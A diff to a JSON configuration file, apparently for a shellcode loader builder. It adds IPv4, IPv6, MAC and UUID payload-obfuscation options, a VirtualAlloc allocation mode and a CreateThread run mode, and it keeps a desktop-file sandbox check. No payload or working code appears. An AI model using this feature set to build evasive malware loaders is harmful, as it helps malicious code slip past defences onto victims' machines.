@@ -1,6 +1,13 @@
 {
   "encryption": [
+    { "id": "ipv4", "label": "ipv4", "encrypt_arg": "ipv4", "feature": "decrypt_ipv4" },
+    { "id": "ipv6", "label": "ipv6", "encrypt_arg": "ipv6", "feature": "decrypt_ipv6" },
+    { "id": "mac", "label": "mac", "encrypt_arg": "mac", "feature": "decrypt_mac" },
+    { "id": "uuid", "label": "uuid", "encrypt_arg": "uuid", "feature": "decrypt_uuid" },
     { "id": "rc4", "label": "rc4", "encrypt_arg": "rc4", "feature": "decrypt_rc4" }
+  ],
+  "alloc_mem_modes": [
+    { "id": "alloc_mem_va", "label": "VirtualAlloc", "feature": "alloc_mem_va" }
   ],
   "run_modes": [
     { "id": "create_thread", "label": "CreateThread 直接执行 (create_thread)", "feature": "run_create_thread" }
@@ -11,7 +18,8 @@
     { "id": "desktop_files", "label": "桌面文件", "feature": "vm_check_desktop_files" }
   ],
   "defaults": {
-    "encryption": "rc4",
-    "run_mode": "create_thread"
+    "encryption": "ipv4",
+    "run_mode": "create_thread",
+    "alloc_mem_mode": "alloc_mem_va"
   }
 }
